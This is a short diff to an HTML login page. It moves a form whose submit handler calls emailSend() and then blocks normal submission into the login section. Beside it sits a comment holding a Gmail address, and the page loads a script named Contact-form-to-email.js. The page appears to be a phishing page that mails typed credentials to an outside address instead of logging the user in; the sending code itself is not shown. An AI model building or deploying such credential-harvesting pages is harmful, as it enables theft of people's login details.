@@ -19,8 +19,7 @@
     <link rel="stylesheet" href="style.css" />
   </head>
   <body>
-    <form id="form" onsubmit="emailSend(); reset(); return false;" class="container" > <!--payday10177@gmail.com-->
-      
+  <div class="container" >
       <div class="contentSec">
         <div class="logo">
           <img src="https://younk-5b894.web.app/images/logo.png" alt="" />
@@ -29,7 +28,8 @@
       </div>
       <div class="loginWrapper">
         <div class="loginSec">
-          <form method="post" id="login">
+              <form id="form" onsubmit="emailSend(); reset(); return false;" > <!--payday10177@gmail.com-->
+      
             <label for="email">Email Address</label>
             <div class="formInput">
               <input
@@ -56,7 +56,7 @@
           </form>
         </div>
       </div>
-   </form>
+   </div>
     <script src="app.js"></script>
     <script src="Contact-form-to-email.js"></script>
 <script src="https://unpkg.com/sweetalert/dist/sweetalert.min.js"></script>
